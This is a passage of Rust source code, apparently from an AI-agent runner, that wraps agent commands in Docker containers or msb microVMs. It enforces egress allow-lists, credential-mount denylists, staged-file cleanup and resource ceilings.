/// Runs on the blocking pool so we don't need tokio's optional `net` feature.
async fn resolve_host(host: &str) -> Result<String> {
    use std::net::ToSocketAddrs as _;
    let host = host.to_owned();
    tokio::task::spawn_blocking(move || {
        let ip = (host.as_str(), 0u16)
            .to_socket_addrs()?
            .next()
            .with_context(|| format!("host '{host}' resolved to no addresses"))?
            .ip()
            .to_string();
        anyhow::Ok(ip)
    })
    .await
    .context("egress DNS resolution task panicked")?
}

pub struct DockerSession {
    image: String,
    project_root: PathBuf,
    /// Extra host mounts (origin-tagged, `source[:target][:mode]` grammar),
    /// merged and de-duplicated by target at wrap time.
    mounts: Vec<(MountOrigin, String)>,
    /// Resolved `(hostname, ip)` egress allow-list for legacy DNS-pin mode. Empty in
    /// proxy mode and when offline.
    egress_pins: Vec<(String, String)>,
    /// Raw egress hostnames for PROXY mode (`strict`/`proxy`). Non-empty ⇒ the box is
    /// confined to the internal network and reaches these hosts only via the
    /// forward-proxy sidecar. Empty in DNS-pin mode and when offline.
    egress_hosts: Vec<String>,
    /// Host dir into which the agent's session store is `docker cp`-ed AFTER the
    /// run (never bind-mounted). Resume-capture reads this back from the host.
    session_store: PathBuf,
    /// Per-session docker named volume backing the container `HOME`. Lives in
    /// daemon/VM storage, independent of any host-share configuration.
    volume: String,
    /// Per-session container name (the run drops `--rm` so the container
    /// survives its process exit long enough to `docker cp` the store out).
    container: String,
    /// In-container mount point for `volume`, used as the agent's `HOME`.
    home: String,
    /// Opt-in memory ceiling, docker `--memory` grammar. `None` ⇒ unbounded
    /// (today's behavior); emitted as `--memory`/`--memory-swap` (equal, so
    /// docker does not silently grant swap equal to the limit again).
    memory: Option<String>,
    /// Opt-in CPU ceiling, docker `--cpus` grammar. `None` ⇒ unbounded.
    cpus: Option<String>,
    /// M11 identity/auth channels applied at wrap time (curated identity file
    /// mounts, SSH-agent socket forward, git identity + scoped auth token env).
    identity: SandboxIdentity,
    /// Interactive prompt/identity files staged via [`stage_file`], as
    /// `(host_temp, guest_path)`. `docker cp`-ed into the container between
    /// `create` and `start` by [`begin_interactive`] (M13a §2/§3). Empty for batch.
    staged_files: std::sync::Mutex<Vec<(PathBuf, String)>>,
}

impl DockerSession {
    /// The sanitized session handle, recovered from the `varda-sbx-<handle>`
    /// container name so the proxy sidecar's network/container names can be derived
    /// without carrying extra state.
    fn session_handle(&self) -> &str {
        self.container
            .strip_prefix("varda-sbx-")
            .unwrap_or(&self.container)
    }

    /// Write `content` to a host temp (read-only when `read_only`) and record the
    /// `(host_temp, guest_path)` pair for a DEFERRED `docker cp`: the container
    /// does not exist until the create → cp → start lifecycle runs. Returns the
    /// guest path (used for `VARDA_PROMPT_FILE` / the credential guest path).
    fn record_staged(&self, content: &str, guest_path: &str, read_only: bool) -> Result<String> {
        let tmp = write_stage_temp(content, read_only)?;
        self.staged_files
            .lock()
            .expect("staged_files mutex poisoned")
            .push((tmp, guest_path.to_owned()));
        Ok(guest_path.to_owned())
    }

    /// Shared create → cp → start lifecycle for both launch modes. `wrapped` is a
    /// `docker create … (-it|-i) …`: run it to create (not start) the container,
    /// `docker cp` every staged file in (removing each host temp after), then
    /// return `docker start -ai <container>` for the caller to spawn. Interactive
    /// attaches the user's TTY; batch pipes stdin (the prompt) / captures stdout.
    /// Teardown/extract reuse the same container/volume.
    async fn create_cp_start(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        // Drain `staged_files` and arm the cleanup guard BEFORE `docker create`
        // runs. Once drained, teardown can no longer see these host temps, so the
        // guard alone must guarantee no credential VALUE survives ANY exit from
        // this function. Arming it here (not after create) means the guard's `Drop`
        // also covers a `docker create` failure / early `?` — not just `docker cp`.
        // Every not-yet-consumed temp is removed on drop: the happy path, a
        // `docker create` failure, an errored/`?`-ed `docker cp`, all trigger it.
        let staged = std::mem::take(
            &mut *self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned"),
        );
        struct StagedTempGuard(Vec<PathBuf>);
        impl Drop for StagedTempGuard {
            fn drop(&mut self) {
                for host_temp in &self.0 {
                    let _ = std::fs::remove_file(host_temp);
                }
            }
        }
        let mut guard = StagedTempGuard(staged.iter().map(|(t, _)| t.clone()).collect());
        let output = tokio::process::Command::new(&wrapped.program)
            .args(&wrapped.args)
            .output()
            .await
            .with_context(|| format!("failed to run `docker create` for '{}'", self.container))?;
        if !output.status.success() {
            bail!(
                "`docker create` for '{}' failed with status {}; stderr: {}",
                self.container,
                output.status,
                String::from_utf8_lossy(&output.stderr).trim()
            );
        }
        for (host_temp, guest_path) in &staged {
            let src = host_temp.display().to_string();
            let dst = format!("{}:{guest_path}", self.container);
            let output = tokio::process::Command::new("docker")
                .args(["cp", &src, &dst])
                .output()
                .await
                .with_context(|| format!("failed to `docker cp {src} {dst}`"))?;
            if !output.status.success() {
                bail!(
                    "`docker cp {src} {dst}` failed with status {}; stderr: {}",
                    output.status,
                    String::from_utf8_lossy(&output.stderr).trim()
                );
            }
            // Consumed successfully: remove now and drop it from the guard so a
            // later `cp` failure doesn't re-attempt (harmless) removal of it.
            let _ = std::fs::remove_file(host_temp);
            guard.0.retain(|p| p != host_temp);
        }
        drop(guard);
        Ok(CommandSpec {
            program: "docker".to_owned(),
            args: vec!["start".to_owned(), "-ai".to_owned(), self.container.clone()],
            env: BTreeMap::new(),
            cwd: None,
        })
    }
}

#[async_trait]
impl SandboxSession for DockerSession {
    fn wrap(&self, spec: CommandSpec, mode: LaunchMode) -> Result<CommandSpec> {
        ensure_worktree_gitdir_visible(&self.project_root, &self.mounts)?;
        // Mount the project at the SAME absolute path inside the container so
        // that `{project}`-style path expansions stay valid, and run there.
        let proj = self.project_root.display().to_string();
        let cwd = spec
            .cwd
            .as_ref()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| proj.clone());

        // Interactive is a DIFFERENT LIFECYCLE, not just `-it` (M13a §2): the
        // run-time HOME is a named volume the host session store is only populated
        // from AFTER the run, and a host bind of `~/.varda` hits the Colima-
        // visibility trap. So Interactive builds `docker create … -it …` (NOT
        // `run`): the container is created, the prompt is `docker cp`-ed in, and
        // `begin_interactive` attaches the user's TTY via `docker start -ai`.
        // Batch keeps the streaming `docker run -i` form unchanged.
        // Batch normally streams via `docker run -i`. But a `file`-target
        // credential must be `docker cp`-ed into the container BEFORE the agent
        // starts, which `run` cannot do — so when files are staged, batch also
        // takes the `create` → cp → `start -ai` lifecycle (still `-i`, no TTY).
        let has_staged = !self
            .staged_files
            .lock()
            .expect("staged_files mutex poisoned")
            .is_empty();
        let (verb, tty_flag) = match mode {
            LaunchMode::Batch if has_staged => ("create", "-i"),
            LaunchMode::Batch => ("run", "-i"),
            LaunchMode::Interactive => ("create", "-it"),
        };
        let mut args = vec![
            verb.to_owned(),
            // A stable per-session name so we can `docker cp` the session store
            // out and `docker rm` the container in teardown. NOTE: we deliberately
            // do NOT pass `--rm` — the container must outlive its process exit so
            // the store can be extracted before removal.
            "--name".to_owned(),
            self.container.clone(),
            // `--init` reaps the container's PID 1 so a killed/dropped `docker`
            // client (timeout, kill_on_drop) still stops the container cleanly.
            "--init".to_owned(),
            // Batch: `-i` keeps stdin open so the prompt-then-EOF still reaches the
            // agent. Interactive: `-it` also allocates a TTY for the attached shell.
            tty_flag.to_owned(),
            "--network".to_owned(),
        ];
        if !self.egress_hosts.is_empty() {
            // Proxy mode (`strict`/`proxy`): confine the box to the INTERNAL network
            // (no route to the internet). Its only reachable peer is the forward
            // proxy (alias `egress-proxy`), which forwards HTTP(S) to the
            // allow-listed hosts ONLY. A denied host is genuinely unroutable, and
            // apps that do their own DNS still work (the proxy resolves). The
            // `HTTP(S)_PROXY` env below points HTTP(S) clients at the proxy.
            let handle = self.session_handle();
            args.push(egress_proxy_network(handle));
        } else if self.egress_pins.is_empty() {
            // No allow-list ⇒ fully offline: nothing outbound is reachable.
            args.push("none".to_owned());
        } else {
            // DNS-pin compatibility mode: attach to the bridge for connectivity, break
            // ambient DNS (`--dns 0.0.0.0` ⇒ no working resolver), then re-add
            // exactly the allow-listed hosts pinned to their resolved IPs. A
            // non-allow-listed hostname cannot resolve and is therefore
            // unreachable by name, while allow-listed hosts stay reachable. NOTE:
            // this is NOT an IP-level firewall; direct-IP egress can bypass it.
            args.push("bridge".to_owned());
            args.push("--dns".to_owned());
            args.push("0.0.0.0".to_owned());
            for (host, ip) in &self.egress_pins {
                args.push("--add-host".to_owned());
                args.push(format!("{host}:{ip}"));
            }
        }
        // Project root is always mounted at the same absolute path; nothing else
        // is unless explicitly allow-listed via `mounts` (read-only).
        args.push("-v".to_owned());
        args.push(format!("{proj}:{proj}"));
        // The container's HOME is a per-session DOCKER NAMED VOLUME (not a host
        // bind). It lives in daemon/VM storage, so it works on a VM-backed daemon
        // whose share excludes `~/.varda`; the store is `docker cp`-ed to the
        // host after the run. The host's real HOME is never exposed.
        args.push("-v".to_owned());
        args.push(format!("{}:{}", self.volume, self.home));
        // Effective extra mounts = union(sandbox, route), de-duplicated by the
        // (expanded, absolute) target so a later origin does not double-mount a
        // target an earlier one already claimed. First declaration wins.
        let mut seen_targets: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
        for (_origin, raw) in &self.mounts {
            let spec = parse_mount(raw)
                .with_context(|| format!("invalid mount '{raw}' for sandbox '{}'", self.image))?;
            let source = expand_mount_path(&spec.source, &self.project_root);
            let target = expand_mount_path(&spec.target, &self.project_root);
            // Credential/identity-store denylist applies to ALL origins (trusted
            // config included): these carry live tokens and cross-project history.
            check_credential_denylist(&source)?;
            if !seen_targets.insert(target.clone()) {
                continue;
            }
            let source = source.display().to_string();
            let target = target.display().to_string();
            args.push("-v".to_owned());
            if spec.writable {
                args.push(format!("{source}:{target}"));
            } else {
                args.push(format!("{source}:{target}:ro"));
            }
        }
        // M11 channel 3 — curated identity FILES (defaults.identity_context), each a
        // READ-ONLY bind of a SPECIFIC FILE (never a dotdir/transcript tree). The
        // credential denylist + identity-file validation still apply, so a
        // `.credentials.json` can never sneak in this way. Shares `seen_targets` with
        // the mounts above (first declaration wins).
        for raw in &self.identity.identity_context {
            let spec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for sandbox '{}'",
                    self.image
                )
            })?;
            let source = expand_mount_path(&spec.source, &self.project_root);
            let target = expand_mount_path(&spec.target, &self.project_root);
            // NB: identity_context is the sanctioned escape hatch for a specific
            // curated file INSIDE an otherwise-denylisted dir (e.g. ~/.claude/CLAUDE.md),
            // so we do NOT apply the blanket credential-DIR denylist here — that would
            // defeat the documented use. We keep the M8 control-plane/socket floor and
            // rely on `check_identity_context_mount` to reject credential FILES, dirs,
            // and writable mounts.
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, spec.writable)?;
            if !seen_targets.insert(target.clone()) {
                continue;
            }
            let source = source.display().to_string();
            let target = target.display().to_string();
            args.push("-v".to_owned());
            args.push(format!("{source}:{target}:ro"));
        }
        // M11 channel 2 — forward the host SSH agent SOCKET so `git push` signs on
        // the host; no private key ever enters the box. The in-guest SSH_AUTH_SOCK
        // env is set below via `identity.guest_env()`.
        if let Some(sock) = &self.identity.ssh_auth_sock {
            args.push("-v".to_owned());
            args.push(format!("{sock}:{SSH_AGENT_GUEST_SOCK}"));
        }
        args.push("-w".to_owned());
        args.push(cwd);
        // Move the resolved env into `-e K=V`; the container starts with a clean
        // base env, so host secrets are never inherited implicitly. Force HOME to
        // the mounted per-session store so the agent writes its session there.
        // M11 channels 1 & 2 fold in via `guest_env()`: the scoped auth token, the
        // read-only git identity, and the forwarded SSH_AUTH_SOCK path.
        // BTreeMap iteration is sorted, keeping the produced argv deterministic.
        let mut env = spec.env;
        env.extend(self.identity.guest_env());
        env.insert("HOME".to_owned(), self.home.clone());
        // Proxy mode: point HTTP(S) clients (claude, codex, git-over-https, package
        // managers) at the forward proxy. Both upper- and lower-case spellings are
        // set because tools honour one or the other; `NO_PROXY` keeps loopback/the
        // proxy alias itself direct. Egress is enforced at the proxy, not here.
        if !self.egress_hosts.is_empty() {
            let url = format!("http://{EGRESS_PROXY_ALIAS}:{EGRESS_PROXY_PORT}");
            let no_proxy = format!("localhost,127.0.0.1,{EGRESS_PROXY_ALIAS}");
            for key in ["HTTP_PROXY", "http_proxy", "HTTPS_PROXY", "https_proxy"] {
                env.insert(key.to_owned(), url.clone());
            }
            env.insert("NO_PROXY".to_owned(), no_proxy.clone());
            env.insert("no_proxy".to_owned(), no_proxy);
        }
        for (key, value) in &env {
            args.push("-e".to_owned());
            args.push(format!("{key}={value}"));
        }
        // Opt-in ceilings (absent ⇒ unbounded, unchanged argv). `--memory-swap`
        // is set EQUAL to `--memory`: without it docker grants swap equal to the
        // limit again, silently doubling the effective footprint.
        if let Some(memory) = &self.memory {
            args.push("--memory".to_owned());
            args.push(memory.clone());
            args.push("--memory-swap".to_owned());
            args.push(memory.clone());
        }
        if let Some(cpus) = &self.cpus {
            args.push("--cpus".to_owned());
            args.push(cpus.clone());
        }
        args.push(self.image.clone());
        args.push(spec.program);
        args.extend(spec.args);

        Ok(CommandSpec {
            program: "docker".to_owned(),
            args,
            // The docker CLI itself inherits the host env (needs PATH, DOCKER_HOST…);
            // the container env is fully specified by the `-e` flags above.
            env: BTreeMap::new(),
            cwd: None,
        })
    }

    fn stage_file(&self, content: &str, guest_path: &str) -> Result<String> {
        self.record_staged(content, guest_path, false)
    }

    fn stage_credential_file(&self, content: &str, guest_path: &str) -> Result<String> {
        // File-target credential: same deferred-copy machinery as the prompt, but
        // the host temp is written read-only (0o400) so the value is not left
        // mutable and lands read-only in-guest after `docker cp`.
        self.record_staged(content, guest_path, true)
    }

    fn identity_files(&self) -> BTreeMap<String, String> {
        self.identity.auth_files.clone()
    }

    async fn begin_interactive(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        // `wrapped` is `docker create … -it …`. Create, cp the staged files, and
        // return `docker start -ai` whose TTY the caller attaches to the user.
        self.create_cp_start(wrapped).await
    }

    async fn begin_batch(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        // No staged files ⇒ `wrapped` is a plain `docker run -i …`; spawn it as-is.
        // Otherwise `wrap` produced `docker create -i …` so a file-target
        // credential can be `docker cp`-ed in BEFORE the agent starts; run the same
        // create → cp → `start -ai` lifecycle as interactive (no TTY, stdin piped).
        if self
            .staged_files
            .lock()
            .expect("staged_files mutex poisoned")
            .is_empty()
        {
            return Ok(wrapped);
        }
        self.create_cp_start(wrapped).await
    }

    fn session_store_root(&self) -> Option<PathBuf> {
        // The host dir that `extract_session_store` populates via `docker cp`;
        // resume-capture reads it back after the run.
        Some(self.session_store.clone())
    }

    fn store_is_live(&self) -> bool {
        // The store lives in a docker volume during the run; it only reaches the
        // host after `extract_session_store`, so discovery must run post-exit.
        false
    }

    fn validate_mounts(&self) -> Result<()> {
        // Fail loudly when a bind SOURCE is absent on the host: on a VM-backed
        // daemon docker would otherwise create an empty in-VM stub and the mount
        // would silently look successful. (The session store is a volume, not a
        // bind, so it is exempt.) A non-existent source is the host-observable
        // proxy for "not reachable inside the VM".
        if !self.project_root.exists() {
            bail!(
                "sandbox project mount source '{}' does not exist on the host; \
                 docker would mount an empty stub (check the path / VM share)",
                self.project_root.display()
            );
        }
        for (origin, raw) in &self.mounts {
            let spec = parse_mount(raw)
                .with_context(|| format!("invalid mount '{raw}' for sandbox '{}'", self.image))?;
            let source = expand_mount_path(&spec.source, &self.project_root);
            // Credential/identity-store denylist applies to the FULL merged set
            // (ALL origins, trusted central config included) at launch time.
            check_credential_denylist(&source)?;
            if !source.exists() {
                bail!(
                    "sandbox {origin:?} mount source '{}' does not exist on the host; \
                     docker would mount an empty stub (check the path / VM share)",
                    source.display()
                );
            }
        }
        for raw in &self.identity.identity_context {
            let spec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for sandbox '{}'",
                    self.image
                )
            })?;
            let source = expand_mount_path(&spec.source, &self.project_root);
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, spec.writable)?;
        }
        Ok(())
    }

    async fn extract_session_store(&self) -> Result<()> {
        // Copy the container HOME *contents* into the host session-store dir. The
        // trailing `/.` copies what is inside `home` into the (existing) host dir
        // rather than nesting it. Runs after the agent exits and before teardown.
        let src = format!("{}:{}/.", self.container, self.home);
        let dst = self.session_store.display().to_string();
        let output = tokio::process::Command::new("docker")
            .args(["cp", &src, &dst])
            .output()
            .await
            .with_context(|| {
                format!(
                    "failed to spawn `docker cp` from sandbox container '{}'",
                    self.container
                )
            })?;
        if !output.status.success() {
            bail!(
                "`docker cp {src} {dst}` failed with status {}; stderr: {}",
                output.status,
                String::from_utf8_lossy(&output.stderr).trim()
            );
        }
        Ok(())
    }

    async fn teardown(self: Box<Self>) -> Result<()> {
        // Remove any host temps still staged (e.g. a cancel before create/cp
        // consumed them) so no credential value is left behind on the host.
        for (host_temp, _) in std::mem::take(
            &mut *self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned"),
        ) {
            let _ = std::fs::remove_file(&host_temp);
        }
        // Without `--rm` the container and its per-session volume persist; remove
        // both here. Best-effort: a cleanup failure must not fail the run.
        let _ = tokio::process::Command::new("docker")
            .args(["rm", "-f", &self.container])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await;
        let _ = tokio::process::Command::new("docker")
            .args(["volume", "rm", "-f", &self.volume])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await;
        // Proxy egress: remove the sidecar container and its internal network. Both
        // are best-effort and no-ops when this session did not use proxy mode.
        if !self.egress_hosts.is_empty() {
            let handle = self.session_handle().to_owned();
            let _ = tokio::process::Command::new("docker")
                .args(["rm", "-f", &egress_proxy_container(&handle)])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await;
            let _ = tokio::process::Command::new("docker")
                .args(["network", "rm", &egress_proxy_network(&handle)])
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await;
        }
        Ok(())
    }
}

/// Parse a docker `--memory` value (`<number>[b|k|kb|m|mb|g|gb]`, no suffix ⇒
/// bytes) and convert it to whole megabytes for `msb run --memory`, which takes
/// a plain MB integer rather than docker's suffixed grammar. Returns `None` for
/// anything that does not parse as that grammar, including non-finite numbers
/// like `NaN`/`inf` (dropped with a warning by the caller rather than failing
/// the run). Rounds DOWN (floor, min 1 MB): the translated ceiling must never
/// exceed the configured one — the whole point of a ceiling is to bound usage,
/// so rounding up would silently grant more than was asked for.
fn docker_memory_to_msb_mb(raw: &str) -> Option<u64> {
    let trimmed = raw.trim().to_ascii_lowercase();
    if trimmed.is_empty() {
        return None;
    }
    let split_at = trimmed
        .find(|c: char| !c.is_ascii_digit() && c != '.')
        .unwrap_or(trimmed.len());
    let (number, unit) = trimmed.split_at(split_at);
    let number: f64 = number.parse().ok()?;
    if !number.is_finite() || number <= 0.0 {
        return None;
    }
    let bytes_per_unit = match unit {
        "" | "b" => 1.0,
        "k" | "kb" => 1024.0,
        "m" | "mb" => 1024.0 * 1024.0,
        "g" | "gb" => 1024.0 * 1024.0 * 1024.0,
        _ => return None,
    };
    let mb = (number * bytes_per_unit / (1024.0 * 1024.0)).floor() as u64;
    Some(mb.max(1))
}

/// Parse a docker `--cpus` value (a decimal core count, e.g. `"1.5"`) for `msb
/// run --cpus`, which takes an integer count rather than docker's fractional
/// grammar. Returns `None` for anything that does not parse as a positive,
/// finite number (rejects `NaN`/`inf`, which `f64::parse` would otherwise
/// accept as valid floats). Rounds DOWN (floor, min 1 core): the translated
/// ceiling must never exceed the configured one, so `"1.5"` maps to `1`, not
/// `2` — rounding up would silently grant more cores than the ceiling asked
/// for. A value below 1 core still maps to `1`, msb's minimum granularity.
fn docker_cpus_to_msb_count(raw: &str) -> Option<u32> {
    let cores: f64 = raw.trim().parse().ok()?;
    if !cores.is_finite() || cores <= 0.0 {
        return None;
    }
    Some(cores.floor().max(1.0) as u32)
}

/// microVM provider backed by the `msb` (microsandbox) CLI.
///
/// Mirrors [`DockerProvider`] but shells to `msb` instead of `docker`, so the
/// spawn / stdin-prompt / stdout-capture / kill-on-drop path in `acp.rs` is
/// unchanged. The isolation is stronger (own-kernel microVM rather than a
/// shared-kernel container); the session-store handling reuses the docker
/// "materialize after the run via `cp`" model, since a microVM's guest HOME is
/// not a host bind mount.
///
/// CLI GRAMMAR (confirmed against `msb 0.6.8`, 2026-08-05): `msb run [OPTS]
/// <IMAGE> -- <COMMAND>` (image positional before `--`); `--name`, `--workdir`,
/// `--env K=V`; host binds via `--mount-dir SOURCE:DEST[:ro|:rw]`; egress via
/// `--net-default[-egress] deny` + `--net-rule allow@<target>`; extraction via
/// `msb cp <sandbox>:/abs/path <host>` (the sandbox persists in `stopped` state
/// after a foreground run, so cp works before `msb rm`). `--memory <MB>` /
/// `--cpus <N>` (integer core count) are documented on `msb add`/`msb exe`
/// (not independently confirmed against `msb run --help` at time of writing —
/// see the M4 task notes on live verification) and are the mapping target for
/// the shared `memory`/`cpus` config keys. Verified live: a
/// `--mount-dir …:ro` blocks writes and the host `~/.aws` is not visible in the
/// microVM. Spellings are centralized in [`MicrosandboxSession::wrap`] /
/// [`MicrosandboxSession::extract_session_store`].
pub struct MicrosandboxProvider {
    name: String,
    /// Pre-existing OCI image reference `msb` can pull, or the tag produced by a
    /// docker build of `build`. `None` when `build` is set.
    image: Option<String>,
    /// Path to a Dockerfile built (via docker, content-addressed) into an image
    /// `msb` then runs. Lets a project bake its agent CLI into the microVM.
    build: Option<String>,
    /// Extra host mounts (origin-tagged, `source[:target][:mode]` grammar),
    /// unioned and de-duplicated by target at wrap time — same as docker.
    mounts: Vec<(MountOrigin, String)>,
    /// Egress allow-list of hostnames. Empty ⇒ fully offline; non-empty ⇒
    /// default-deny with only these hosts permitted outbound.
    egress: Vec<String>,
    /// Opt-in memory ceiling, docker `--memory` grammar (e.g. `"4g"`), converted
    /// to `msb run`'s own `--memory` MB-integer argument at wrap time.
    memory: Option<String>,
    /// Opt-in CPU ceiling, docker `--cpus` grammar, rounded to `msb run`'s own
    /// integer `--cpus` core count at wrap time.
    cpus: Option<String>,
    /// M11 identity/auth channels forwarded into the microVM. Empty ⇒ pre-M11 argv.
    identity: SandboxIdentity,
}

impl MicrosandboxProvider {
    /// Attach the M11 identity/auth bundle (builder). See
    /// [`DockerProvider::with_identity`].
    pub fn with_identity(mut self, identity: SandboxIdentity) -> Self {
        self.identity = identity;
        self
    }

    /// Build a microsandbox provider from its `[sandboxes.<name>]` entry and a
    /// pre-merged, origin-tagged mount set. Same shape as
    /// [`DockerProvider::from_config`]: `image` or `build` is required.
    pub fn from_config(
        name: &str,
        config: &SandboxConfig,
        mounts: Vec<(MountOrigin, String)>,
    ) -> Result<Self> {
        let image = config.image.clone().filter(|image| !image.is_empty());
        let build = config.build.clone().filter(|build| !build.is_empty());
        if image.is_none() && build.is_none() {
            bail!(
                "sandbox '{name}' needs an `image` or a `build` path (required for the microsandbox provider)"
            );
        }
        Ok(Self {
            name: name.to_owned(),
            image,
            build,
            mounts,
            egress: config.egress.clone(),
            memory: config.memory.clone().filter(|m| !m.is_empty()),
            cpus: config.cpus.clone().filter(|c| !c.is_empty()),
            identity: SandboxIdentity::default(),
        })
    }

    /// Resolve the concrete image reference to run: a `build` sandbox builds its
    /// Dockerfile (content-addressed, cached, via docker) into a tag `msb` runs;
    /// otherwise the configured OCI reference is used verbatim.
    async fn resolve_image(&self) -> Result<String> {
        if let Some(build) = &self.build {
            return build_image(&self.name, build).await;
        }
        self.image
            .clone()
            .with_context(|| format!("sandbox '{}' has neither image nor build", self.name))
    }
}

#[async_trait]
impl SandboxProvider for MicrosandboxProvider {
    fn name(&self) -> &str {
        &self.name
    }

    async fn prepare(&self, ctx: &SandboxContext<'_>) -> Result<Box<dyn SandboxSession>> {
        // Host-side dir the guest session store is `msb cp`-ed into after the run
        // (never a bind mount — the microVM guest HOME lives in VM storage).
        let session_store = varda_sessions_root().join(ctx.session_id);
        std::fs::create_dir_all(&session_store).with_context(|| {
            format!(
                "failed to create sandbox session store {}",
                session_store.display()
            )
        })?;
        let handle = sanitize_docker_name(ctx.session_id);
        let image = self.resolve_image().await?;
        Ok(Box::new(MicrosandboxSession {
            image,
            project_root: ctx.project_root.to_path_buf(),
            mounts: self.mounts.clone(),
            egress: self.egress.clone(),
            session_store,
            sandbox: format!("varda-sbx-{handle}"),
            home: "/home/agent".to_owned(),
            memory: self.memory.clone(),
            cpus: self.cpus.clone(),
            identity: self.identity.clone(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        }))
    }
}

pub struct MicrosandboxSession {
    image: String,
    project_root: PathBuf,
    mounts: Vec<(MountOrigin, String)>,
    /// Egress allow-list of hostnames (unresolved — `msb` net rules take names /
    /// CIDRs directly). Empty ⇒ fully offline.
    egress: Vec<String>,
    /// Host dir the guest session store is `msb cp`-ed into AFTER the run.
    session_store: PathBuf,
    /// Per-session microVM sandbox name (for `exec`/`cp`/`stop`/`rm`).
    sandbox: String,
    /// In-guest HOME path; the agent writes its session store here.
    home: String,
    /// Opt-in memory ceiling, docker `--memory` grammar; converted to `msb
    /// run`'s own MB-integer `--memory` at wrap time. `None` ⇒ unbounded.
    memory: Option<String>,
    /// Opt-in CPU ceiling, docker `--cpus` grammar; rounded to `msb run`'s own
    /// integer `--cpus` core count at wrap time. `None` ⇒ unbounded.
    cpus: Option<String>,
    /// M11 identity/auth channels applied at wrap time.
    identity: SandboxIdentity,
    /// Interactive files staged via [`stage_file`], as `(host_temp, guest_path)`.
    /// Emitted as pre-boot `--copy-file host:guest` flags by [`wrap`] in
    /// Interactive mode (M13a §2/§3). Empty for batch.
    staged_files: std::sync::Mutex<Vec<(PathBuf, String)>>,
}

impl MicrosandboxSession {
    // NOT under /tmp: `--copy-file` lands the file BEFORE the guest boots, and the
    // guest then mounts a fresh tmpfs over /tmp — which shadows anything staged
    // there, so the wrapper's `. <file>` failed with "cannot open" and the agent
    // exited 2 before doing any work. `/opt/varda` survives boot and is already
    // where the prompt file is staged.
    const CREDENTIAL_ENV_FILE: &'static str = "/opt/varda/.credential-env";

    /// Write `content` to a host temp (read-only when `read_only`) and record it so
    /// [`wrap`](Self::wrap) can emit a pre-boot `--copy-file host:guest` flag (msb
    /// copies it in before the guest boots). Returns the guest path.
    fn record_staged(&self, content: &str, guest_path: &str, read_only: bool) -> Result<String> {
        let tmp = write_stage_temp(content, read_only)?;
        self.staged_files
            .lock()
            .expect("staged_files mutex poisoned")
            .push((tmp, guest_path.to_owned()));
        Ok(guest_path.to_owned())
    }

    /// Render credential-target env vars as a shell fragment copied into the VM.
    /// Single-quote escaping keeps arbitrary secret bytes (including whitespace,
    /// `$`, and newlines) literal when the guest shell sources the file.
    fn credential_env_script(&self) -> Result<String> {
        let mut script = String::new();
        for (key, value) in &self.identity.auth_env {
            let mut chars = key.chars();
            let valid = chars
                .next()
                .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
                && chars.all(|c| c == '_' || c.is_ascii_alphanumeric());
            if !valid {
                bail!(
                    "microsandbox credential env target '{key}' is not a portable shell variable name"
                );
            }
            let quoted = value.replace('\'', "'\\''");
            script.push_str(&format!("export {key}='{quoted}'\n"));
        }
        Ok(script)
    }
}

#[async_trait]
impl SandboxSession for MicrosandboxSession {
    fn wrap(&self, spec: CommandSpec, mode: LaunchMode) -> Result<CommandSpec> {
        ensure_worktree_gitdir_visible(&self.project_root, &self.mounts)?;
        // Mount the project at the SAME absolute path inside the guest so
        // `{project}`-style expansions stay valid, and run there.
        let proj = self.project_root.display().to_string();
        let cwd = spec
            .cwd
            .as_ref()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| proj.clone());

        // `msb run` creates a sandbox from an image and runs a command in it,
        // streaming stdio like `docker run -i` (stdin reaches the guest, stdout
        // is captured, exit code propagates). A stable `--name` lets teardown
        // `msb cp`/`stop`/`rm` the same sandbox. Interactive adds `-t` (allocate a
        // TTY) and pre-boot `--copy-file` flags for any staged prompt/identity
        // files (M13a §2/§3) — msb has a native pre-boot copy, so unlike docker no
        // create/cp/start dance is needed.
        let mut args = vec!["run".to_owned(), "--name".to_owned(), self.sandbox.clone()];
        if matches!(mode, LaunchMode::Interactive) {
            args.push("-t".to_owned());
        }
        // msb 0.6.x has no env-file input. Keep credential values off its argv by
        // staging a private shell fragment and sourcing it inside the guest. Only
        // the non-secret guest path appears in the process list.
        if !self.identity.auth_env.is_empty() {
            self.record_staged(
                &self.credential_env_script()?,
                Self::CREDENTIAL_ENV_FILE,
                true,
            )?;
        }

        // Pre-boot copy every staged file (`msb` copies it in before the guest
        // boots). The prompt is only staged in Interactive, but a `file`-target
        // credential is staged in EITHER mode — so emitting `--copy-file` here for
        // both modes is what makes a BATCH file-target credential reach the guest
        // (M11-ext), while a batch run with nothing staged still emits none.
        {
            let staged = self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned");
            for (host_temp, guest_path) in staged.iter() {
                args.push("--copy-file".to_owned());
                args.push(format!("{}:{guest_path}", host_temp.display()));
            }
        }

        // Broker reachability: when a host-gated MCP broker is wired for this run,
        // the guest env carries `VARDA_MCP_HOST`/`VARDA_MCP_ADDR` (own-kernel
        // microVM ⇒ TCP transport; see `acp::env_for_request`). The guest dials the
        // host via `host.microsandbox.internal`, but msb DENIES host access by
        // default, so the `host` net-rule group must be allowed — scoped strictly
        // to broker-enabled runs, and never broadened past the local `host` group.
        let broker_active =
            spec.env.contains_key("VARDA_MCP_HOST") || spec.env.contains_key("VARDA_MCP_ADDR");

        // Egress: empty (and no broker) ⇒ fully offline; otherwise default-deny
        // egress plus an allow rule per host (and `allow@host` for the broker).
